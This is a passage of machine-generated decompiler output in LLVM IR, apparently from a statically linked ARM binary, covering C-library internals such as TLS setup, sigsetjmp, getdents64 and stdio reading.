  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17748, align 4
  %v0_17750 = load i32, i32* @r6, align 4
  %v2_17750 = icmp eq i32 %v0_17750, 0
  %v1_17754 = load i32, i32* %r8.global-to-local, align 4
  %v2_17754 = add i32 %v1_17754, 44
  %v3_17754 = inttoptr i32 %v2_17754 to i32*
  store i32 1, i32* %v3_17754, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1775c = load i32, i32* %sl.global-to-local, align 4
  %v1_1775c = load i32, i32* %r1.global-to-local, align 4
  %v2_1775c = add i32 %v1_1775c, %v0_1775c
  store i32 %v2_1775c, i32* %r2.global-to-local, align 4
  %v1_17760 = load i32, i32* @r6, align 4
  br i1 %v2_17750, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17674
  store i32 %v1_17760, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1776c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1776c35 = add i32 %v1_1776c34, 32
  %v3_1776c36 = inttoptr i32 %v2_1776c35 to i32*
  store i32 %v1_17760, i32* %v3_1776c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17674
  %v2_17764 = add i32 %v1_17760, -1
  store i32 %v2_17764, i32* %r0.global-to-local, align 4
  %v1_1776c = load i32, i32* %r8.global-to-local, align 4
  %v2_1776c = add i32 %v1_1776c, 32
  %v3_1776c = inttoptr i32 %v2_1776c to i32*
  store i32 %v1_17760, i32* %v3_1776c, align 4
  %v1_17770 = load i32, i32* @r6, align 4
  store i32 %v1_17770, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17774 = load i32, i32* %r8.global-to-local, align 4
  %v1_17774 = load i32, i32* %r2.global-to-local, align 4
  %v2_17774 = add i32 %v1_17774, 28
  %v3_17774 = inttoptr i32 %v2_17774 to i32*
  store i32 %v0_17774, i32* %v3_17774, align 4
  %v0_17778 = load i32, i32* %r2.global-to-local, align 4
  %v1_17778 = load i32, i32* %ip.global-to-local, align 4
  %v2_17778 = inttoptr i32 %v1_17778 to i32*
  store i32 %v0_17778, i32* %v2_17778, align 4
  %v0_1777c = load i32, i32* %r0.global-to-local, align 4
  %v1_1777c = load i32, i32* %r3.global-to-local, align 4
  %v2_1777c = add i32 %v1_1777c, %v0_1777c
  store i32 %v2_1777c, i32* %r0.global-to-local, align 4
  %v1_17780 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17750, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17788.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17788 = phi i32 [ %v0_17788.pre, %._crit_edge ], [ %v1_17780, %bb54 ]
  %v2_17784 = udiv i32 %v2_1777c, %v1_17780
  %v2_17788 = load i32, i32* %sb.global-to-local, align 4
  %v3_17788 = mul i32 %v2_17784, %v0_17788
  %v4_17788 = add i32 %v2_17788, %v3_17788
  store i32 %v4_17788, i32* @r0, align 4
  %v0_1778c = load i32, i32* %fp.global-to-local, align 4
  %v2_1778c = icmp ult i32 %v0_1778c, 16
  %v0_1778c. = select i1 %v2_1778c, i32 16, i32 %v0_1778c
  store i32 %v0_1778c., i32* @r1, align 4
  %v2_1779c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1779c, i32* @r4, align 4
  store i32 %v6_175b8, i32* @r5, align 4
  store i32 %v15_175b8, i32* %r8.global-to-local, align 4
  store i32 %v18_175b8, i32* %sb.global-to-local, align 4
  store i32 %v21_175b8, i32* %sl.global-to-local, align 4
  store i32 %v24_175b8, i32* %fp.global-to-local, align 4
  store i32 %v27_175b8, i32* @lr, align 4
  %v0_177a0 = call i32 @init_static_tls()
  store i32 %v0_177a0, i32* %r0.global-to-local, align 4
  %v0_177ac.pre = load i32, i32* @ip, align 4
  %v1_17674.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17684.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_177a4

dec_label_pc_17630.dec_label_pc_177a4.loopexit_crit_edge: ; preds = %dec_label_pc_1762c
  br label %dec_label_pc_177a4.loopexit

dec_label_pc_177a4.loopexit:                      ; preds = %dec_label_pc_17630.dec_label_pc_177a4.loopexit_crit_edge, %dec_label_pc_175e4
  br label %dec_label_pc_177a4

dec_label_pc_177a4:                               ; preds = %dec_label_pc_177a4.loopexit, %entry, %bb55
  %v0_17684.pre.pre = phi i32 [ ptrtoint (i32* @global_var_219e0.355 to i32), %dec_label_pc_177a4.loopexit ], [ ptrtoint (i32* @global_var_219e0.355 to i32), %entry ], [ %v0_17684.pre.pre.pre, %bb55 ]
  %v1_17674.pre.pre = phi i32 [ %v0_175d8, %dec_label_pc_177a4.loopexit ], [ %v0_175d8, %entry ], [ %v1_17674.pre.pre.pre, %bb55 ]
  %v0_177ac = phi i32 [ %v0_175dc, %dec_label_pc_177a4.loopexit ], [ %v0_175dc, %entry ], [ %v0_177ac.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_177ac, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17670

; uselistorder directives
  uselistorder i32 %v0_177ac, { 1, 0 }
  uselistorder i32 %v1_17760, { 1, 0, 2, 3 }
  uselistorder i32 %v0_176cc, { 1, 0 }
  uselistorder i32 %v2_176c8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1762c, { 2, 1, 0 }
  uselistorder i32 %v3_17604, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1760c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17630, { 1, 0 }
  uselistorder i32 %v0_175dc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_175d8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_175cc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_177a4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17674, { 1, 0 }
  uselistorder label %dec_label_pc_17670, { 1, 0 }
  uselistorder label %dec_label_pc_175f4, { 1, 0 }
}

define i32 @function_177c4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_177c4:
  %v0_177c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_177c4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_177c4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_177c4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_177f0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_177f0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v4_17800 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 156) to i32*), align 4
  %v4_17808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 104) to i32*), align 4
  store i32 %v4_17808, i32* %r1.global-to-local, align 4
  %v1_1780c = add i32 %arg1, 44
  %v2_1780c = inttoptr i32 %v1_1780c to i32*
  %v3_1780c = load i32, i32* %v2_1780c, align 4
  %v1_17810 = add i32 %arg1, 28
  %v2_17810 = inttoptr i32 %v1_17810 to i32*
  %v3_17810 = load i32, i32* %v2_17810, align 4
  store i32 %v3_17810, i32* %r2.global-to-local, align 4
  %v2_17814 = inttoptr i32 %v4_17800 to i32*
  store i32 %v3_1780c, i32* %v2_17814, align 4
  %v0_17818 = load i32, i32* %r2.global-to-local, align 4
  %v1_17818 = load i32, i32* %r1.global-to-local, align 4
  %v2_17818 = inttoptr i32 %v1_17818 to i32*
  store i32 %v0_17818, i32* %v2_17818, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17824(i32 %arg1) local_unnamed_addr {
dec_label_pc_17824:
  %v0_17824 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17824, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17824
  %v1_17824 = load i32, i32* @ip, align 4
  %v3_17824 = mul i32 %v1_17824, %arg1
  %v2_17828 = load i32, i32* @r8, align 4
  %v4_17828 = and i32 %v2_17828, %v3_17824
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17824, %bb
  %v5_17828 = phi i32 [ %arg1, %dec_label_pc_17824 ], [ %v4_17828, %bb ]
  ret i32 %v5_17828

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17834 = add i32 %arg1, 40
  store i32 %v1_17834, i32* %r2.global-to-local, align 4
  %v1_17838 = inttoptr i32 %v1_17834 to i32*
  %v2_17838 = load i32, i32* %v1_17838, align 4
  store i32 %v2_17838, i32* %r2.global-to-local, align 4
  %v3_17838 = add i32 %arg1, 44
  %v4_17838 = inttoptr i32 %v3_17838 to i32*
  %v5_17838 = load i32, i32* %v4_17838, align 4
  store i32 %v5_17838, i32* %r3.global-to-local, align 4
  %v0_1783c = call i32 @__aeabi_read_tp()
  %v1_17840 = inttoptr i32 %v0_1783c to i32*
  %v2_17840 = load i32, i32* %v1_17840, align 4
  store i32 %v2_17840, i32* %r1.global-to-local, align 4
  %v3_17844 = mul i32 %v5_17838, 8
  store i32 %v3_17844, i32* %r3.global-to-local, align 4
  %v1_17848 = load i32, i32* %r2.global-to-local, align 4
  %v2_17848 = add i32 %v1_17848, %v0_1783c
  %v3_1784c = add i32 %v3_17844, %v2_17840
  %v4_1784c = inttoptr i32 %v3_1784c to i32*
  store i32 %v2_17848, i32* %v4_1784c, align 4
  %v0_17850 = load i32, i32* %r3.global-to-local, align 4
  %v1_17850 = load i32, i32* %r1.global-to-local, align 4
  %v2_17850 = add i32 %v1_17850, %v0_17850
  store i32 %v2_17850, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17858 = add i32 %v2_17850, 4
  %v5_17858 = inttoptr i32 %v4_17858 to i8*
  store i8 1, i8* %v5_17858, align 1
  %v0_1785c = load i32, i32* @r4, align 4
  %v1_1785c = add i32 %v0_1785c, 20
  store i32 %v1_1785c, i32* %r1.global-to-local, align 4
  %v1_17860 = inttoptr i32 %v1_1785c to i32*
  %v2_17860 = load i32, i32* %v1_17860, align 4
  store i32 %v2_17860, i32* @r1, align 4
  %v3_17860 = add i32 %v0_1785c, 24
  %v4_17860 = inttoptr i32 %v3_17860 to i32*
  %v5_17860 = load i32, i32* %v4_17860, align 4
  store i32 %v5_17860, i32* %r2.global-to-local, align 4
  %v5_17864 = call i32 @__GI_mempcpy(i32 %v2_17848, i32 %v2_17860, i32 %v5_17860, i32 1)
  %v0_17868 = load i32, i32* @r4, align 4
  %v1_17868 = add i32 %v0_17868, 28
  store i32 %v1_17868, i32* %r3.global-to-local, align 4
  %v1_1786c = inttoptr i32 %v1_17868 to i32*
  %v2_1786c = load i32, i32* %v1_1786c, align 4
  store i32 %v2_1786c, i32* %r2.global-to-local, align 4
  %v3_1786c = add i32 %v0_17868, 24
  %v4_1786c = inttoptr i32 %v3_1786c to i32*
  %v5_1786c = load i32, i32* %v4_1786c, align 4
  store i32 %v5_1786c, i32* %r3.global-to-local, align 4
  %v2_17870 = sub i32 %v5_1786c, %v2_1786c
  store i32 %v2_17870, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17878 = inttoptr i32 %v5_17864 to i8*
  %v4_17878 = call i32 @__GI_memset(i8* %v3_17878, i32 0, i32 %v2_17870)
  ret i32 %v4_17878

; uselistorder directives
  uselistorder i32 %v3_17844, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_178c8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_178dc = load i32, i32* @r0, align 4
  %v1_178e0 = inttoptr i32 %v0_178dc to i32*
  %v2_178e0 = load i32, i32* @r4, align 4
  store i32 %v2_178e0, i32* %v1_178e0, align 4
  %v3_178e0 = add i32 %v0_178dc, 4
  %v4_178e0 = inttoptr i32 %v3_178e0 to i32*
  %v5_178e0 = load i32, i32* @r5, align 4
  store i32 %v5_178e0, i32* %v4_178e0, align 4
  %v6_178e0 = add i32 %v0_178dc, 8
  %v7_178e0 = inttoptr i32 %v6_178e0 to i32*
  %v8_178e0 = load i32, i32* @r6, align 4
  store i32 %v8_178e0, i32* %v7_178e0, align 4
  %v9_178e0 = add i32 %v0_178dc, 12
  %v10_178e0 = inttoptr i32 %v9_178e0 to i32*
  %v11_178e0 = load i32, i32* @r7, align 4
  store i32 %v11_178e0, i32* %v10_178e0, align 4
  %v12_178e0 = add i32 %v0_178dc, 16
  %v13_178e0 = inttoptr i32 %v12_178e0 to i32*
  %v14_178e0 = load i32, i32* @r8, align 4
  store i32 %v14_178e0, i32* %v13_178e0, align 4
  %v15_178e0 = add i32 %v0_178dc, 20
  %v16_178e0 = inttoptr i32 %v15_178e0 to i32*
  %v17_178e0 = load i32, i32* @sb, align 4
  store i32 %v17_178e0, i32* %v16_178e0, align 4
  %v18_178e0 = add i32 %v0_178dc, 24
  %v19_178e0 = inttoptr i32 %v18_178e0 to i32*
  %v20_178e0 = load i32, i32* @sl, align 4
  store i32 %v20_178e0, i32* %v19_178e0, align 4
  %v21_178e0 = add i32 %v0_178dc, 28
  %v22_178e0 = inttoptr i32 %v21_178e0 to i32*
  %v23_178e0 = load i32, i32* @fp, align 4
  store i32 %v23_178e0, i32* %v22_178e0, align 4
  %v24_178e0 = add i32 %v0_178dc, 32
  %v25_178e0 = inttoptr i32 %v24_178e0 to i32*
  %v27_178e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_178e0, i32* %v25_178e0, align 4
  %v28_178e0 = add i32 %v0_178dc, 36
  %v29_178e0 = inttoptr i32 %v28_178e0 to i32*
  %v30_178e0 = load i32, i32* @lr, align 4
  store i32 %v30_178e0, i32* %v29_178e0, align 4
  %v0_178e4 = call i32 @__sigjmp_save()
  ret i32 %v0_178e4

; uselistorder directives
  uselistorder i32 %v0_178dc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 95, 96, 6, 7, 8, 9, 10, 11, 12, 13, 83, 84, 85, 86, 87, 89, 88, 90, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 30, 31, 26, 27, 28, 29, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 2, 3, 4, 5, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 91, 92, 93, 94 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_178ec = load i32, i32* @r5, align 4
  %v12_178ec = load i32, i32* @r7, align 4
  %v1_178f0 = add i32 %arg3, 14
  %v2_178f8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_178fc = and i32 %v1_178f0, -8
  %v2_17900 = sub i32 %v2_178f8, %v1_178fc
  %v1_17904 = add i32 %v2_17900, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17948, label %dec_label_pc_1792c

dec_label_pc_1792c:                               ; preds = %entry
  %v1_17930 = sub i32 0, %arg1
  %v3_17934 = load i16, i16* @global_var_21a38.351, align 2
  %v4_17934 = sext i16 %v3_17934 to i32
  %v0_17938 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17940 = add i32 %v4_17934, %v0_17938
  %v4_17940 = inttoptr i32 %v3_17940 to i32*
  store i32 %v1_17930, i32* %v4_17940, align 4
  br label %dec_label_pc_17a18

dec_label_pc_17948:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17a18, label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %dec_label_pc_17948
  %v2_17950 = add i32 %v1_17904, %arg1
  store i32 %v2_17950, i32* %r1.global-to-local, align 4
  %v2_17954 = add i32 %tmp, %arg3
  store i32 %v1_17904, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17a00

dec_label_pc_17970:                               ; preds = %dec_label_pc_17a00
  %v1_17970 = add i32 %v0_179d0, 16
  %v2_17970 = inttoptr i32 %v1_17970 to i16*
  %v3_17970 = load i16, i16* %v2_17970, align 2
  %v4_17970 = zext i16 %v3_17970 to i32
  %v1_17974 = add nsw i32 %v4_17970, -19
  store i32 %v1_17974, i32* @r2, align 4
  %v1_17978 = add nuw nsw i32 %v4_17970, 7
  %v1_1797c = and i32 %v1_17978, 131064
  store i32 %v1_1797c, i32* @ip, align 4
  %v2_17984 = add i32 %v1_1797c, %v0_179d8
  store i32 %v2_17984, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17984, %v2_17954
  br i1 %tmp24, label %dec_label_pc_17990, label %dec_label_pc_179cc

dec_label_pc_17990:                               ; preds = %dec_label_pc_17970
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17998 = load i32, i32* %r8.global-to-local, align 4
  %v0_1799c = load i32, i32* %sb.global-to-local, align 4
  %v1_179a0 = load i32, i32* @sp, align 4
  %v2_179a0 = inttoptr i32 %v1_179a0 to i32*
  store i32 0, i32* %v2_179a0, align 4
  %v4_179a4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17998, i32 %v0_1799c)
  %v0_179a8 = load i32, i32* @r5, align 4
  %v1_179a8 = load i32, i32* %sl.global-to-local, align 4
  %v9_179a8 = icmp eq i32 %v0_179a8, %v1_179a8
  br i1 %v9_179a8, label %dec_label_pc_179b0, label %dec_label_pc_17a14

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17990
  %v0_179b4 = call i32 @__aeabi_read_tp()
  %v3_179b8 = load i16, i16* @global_var_21a38.351, align 2
  %v4_179b8 = sext i16 %v3_179b8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_179c4 = add i32 %v4_179b8, %v0_179b4
  %v4_179c4 = inttoptr i32 %v3_179c4 to i32*
  store i32 22, i32* %v4_179c4, align 4
  br label %dec_label_pc_17a18

dec_label_pc_179cc:                               ; preds = %dec_label_pc_17970
  %v1_179cc = inttoptr i32 %v0_179d0 to i32*
  %v2_179cc = load i32, i32* %v1_179cc, align 4
  %v3_179cc = add i32 %v0_179d0, 4
  %v4_179cc = inttoptr i32 %v3_179cc to i32*
  %v5_179cc = load i32, i32* %v4_179cc, align 4
  store i32 %v5_179cc, i32* @r4, align 4
  %v1_179d0 = add i32 %v0_179d0, 8
  store i32 %v1_179d0, i32* %r8.global-to-local, align 4
  %v1_179d4 = inttoptr i32 %v1_179d0 to i32*
  %v2_179d4 = load i32, i32* %v1_179d4, align 4
  store i32 %v2_179d4, i32* %r8.global-to-local, align 4
  %v3_179d4 = add i32 %v0_179d0, 12
  %v4_179d4 = inttoptr i32 %v3_179d4 to i32*
  %v5_179d4 = load i32, i32* %v4_179d4, align 4
  store i32 %v5_179d4, i32* %sb.global-to-local, align 4
  %v1_179d8 = inttoptr i32 %v0_179d8 to i32*
  store i32 %v2_179cc, i32* %v1_179d8, align 4
  %v3_179d8 = add i32 %v0_179d8, 4
  %v4_179d8 = inttoptr i32 %v3_179d8 to i32*
  %v5_179d8 = load i32, i32* @r4, align 4
  store i32 %v5_179d8, i32* %v4_179d8, align 4
  %v0_179dc = load i32, i32* %r8.global-to-local, align 4
  %v1_179dc = load i32, i32* @r5, align 4
  %v2_179dc = add i32 %v1_179dc, 8
  %v3_179dc = inttoptr i32 %v2_179dc to i32*
  store i32 %v0_179dc, i32* %v3_179dc, align 4
  %v0_179e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_179e0 = load i32, i32* @r5, align 4
  %v2_179e0 = add i32 %v1_179e0, 12
  %v3_179e0 = inttoptr i32 %v2_179e0 to i32*
  store i32 %v0_179e0, i32* %v3_179e0, align 4
  %v0_179e4 = load i32, i32* @ip, align 4
  %v1_179e4 = trunc i32 %v0_179e4 to i16
  %v2_179e4 = load i32, i32* @r5, align 4
  %v3_179e4 = add i32 %v2_179e4, 16
  %v4_179e4 = inttoptr i32 %v3_179e4 to i16*
  store i16 %v1_179e4, i16* %v4_179e4, align 2
  %v0_179e8 = load i32, i32* @r7, align 4
  %v1_179e8 = add i32 %v0_179e8, 18
  %v2_179e8 = inttoptr i32 %v1_179e8 to i8*
  %v3_179e8 = load i8, i8* %v2_179e8, align 1
  %v4_179e8 = zext i8 %v3_179e8 to i32
  store i32 %v4_179e8, i32* @r3, align 4
  %v2_179ec = load i32, i32* @r5, align 4
  %v3_179ec = add i32 %v2_179ec, 18
  %v4_179ec = inttoptr i32 %v3_179ec to i8*
  store i8 %v3_179e8, i8* %v4_179ec, align 1
  %v0_179f0 = call i32 @memcpy()
  %v0_179f4 = load i32, i32* @r7, align 4
  %v1_179f4 = add i32 %v0_179f4, 16
  %v2_179f4 = inttoptr i32 %v1_179f4 to i16*
  %v3_179f4 = load i16, i16* %v2_179f4, align 2
  %v4_179f4 = zext i16 %v3_179f4 to i32
  %v0_179f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_179f8, i32* @r5, align 4
  %v2_179fc = add i32 %v4_179f4, %v0_179f4
  store i32 %v2_179fc, i32* @r7, align 4
  br label %dec_label_pc_17a00

dec_label_pc_17a00:                               ; preds = %dec_label_pc_17950, %dec_label_pc_179cc
  %v0_179d8 = phi i32 [ %tmp, %dec_label_pc_17950 ], [ %v0_179f8, %dec_label_pc_179cc ]
  %v0_179d0 = phi i32 [ %v1_17904, %dec_label_pc_17950 ], [ %v2_179fc, %dec_label_pc_179cc ]
  %v3_17a04 = icmp ult i32 %v0_179d0, %v2_17950
  %v1_17a08 = add i32 %v0_179d8, 19
  store i32 %v1_17a08, i32* @r0, align 4
  %v1_17a0c = add i32 %v0_179d0, 19
  store i32 %v1_17a0c, i32* @r1, align 4
  br i1 %v3_17a04, label %dec_label_pc_17970, label %dec_label_pc_17a14.loopexit

dec_label_pc_17a14.loopexit:                      ; preds = %dec_label_pc_17a00
  %v0_17a14.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17a14

dec_label_pc_17a14:                               ; preds = %dec_label_pc_17a14.loopexit, %dec_label_pc_17990
  %v1_17a14 = phi i32 [ %v0_179d8, %dec_label_pc_17a14.loopexit ], [ %v0_179a8, %dec_label_pc_17990 ]
  %v0_17a14 = phi i32 [ %v0_17a14.pre, %dec_label_pc_17a14.loopexit ], [ %v1_179a8, %dec_label_pc_17990 ]
  %v2_17a14 = sub i32 %v1_17a14, %v0_17a14
  store i32 %v2_17a14, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17a18

dec_label_pc_17a18:                               ; preds = %dec_label_pc_17948, %dec_label_pc_179b0, %dec_label_pc_1792c, %dec_label_pc_17a14
  %v0_17a18 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_178ec, i32* @r5, align 4
  store i32 %v12_178ec, i32* @r7, align 4
  ret i32 %v0_17a18

; uselistorder directives
  uselistorder i32 %v0_179d0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_179d8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17904, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 12, 5, 6, 7, 1, 13, 2, 14 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 3, 2, 4, 0, 5, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_17a18, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17a00, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17a30 = load i32, i32* @r4, align 4
  store i32 %v3_17a30, i32* %stack_var_-12, align 4
  %v0_17a34 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a34 = inttoptr i32 %v0_17a34 to i16*
  %v2_17a34 = load i16, i16* %v1_17a34, align 2
  %v3_17a34 = zext i16 %v2_17a34 to i32
  store i32 %v3_17a34, i32* @r3, align 4
  %v1_17a38 = and i32 %v3_17a34, 4
  store i32 %v1_17a38, i32* @r5, align 4
  %v2_17a38 = icmp eq i32 %v1_17a38, 0
  store i32 %v0_17a34, i32* @r4, align 4
  br i1 %v2_17a38, label %dec_label_pc_17a4c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_17a4c:                               ; preds = %entry
  %v1_17a4c = icmp slt i32 %arg2, 0
  br i1 %v1_17a4c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_17a4c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_17a4c, %bb18
  %v1_17a54 = add i32 %v0_17a34, 4
  %v2_17a54 = inttoptr i32 %v1_17a54 to i32*
  %v3_17a54 = load i32, i32* %v2_17a54, align 4
  store i32 %v3_17a54, i32* %r0.global-to-local, align 4
  %v1_17a58 = call i32 @__libc_read(i32 %v3_17a54)
  store i32 %v1_17a58, i32* %r0.global-to-local, align 4
  %v5_17a60 = icmp sgt i32 %v1_17a58, 0
  br i1 %v5_17a60, label %.thread7, label %dec_label_pc_17a64

dec_label_pc_17a64:                               ; preds = %bb19
  %v2_17a5c = icmp eq i32 %v1_17a58, 0
  %v0_17a64 = load i32, i32* @r4, align 4
  %v1_17a64 = inttoptr i32 %v0_17a64 to i16*
  %v2_17a64 = load i16, i16* %v1_17a64, align 2
  br i1 %v2_17a5c, label %bb20, label %bb21

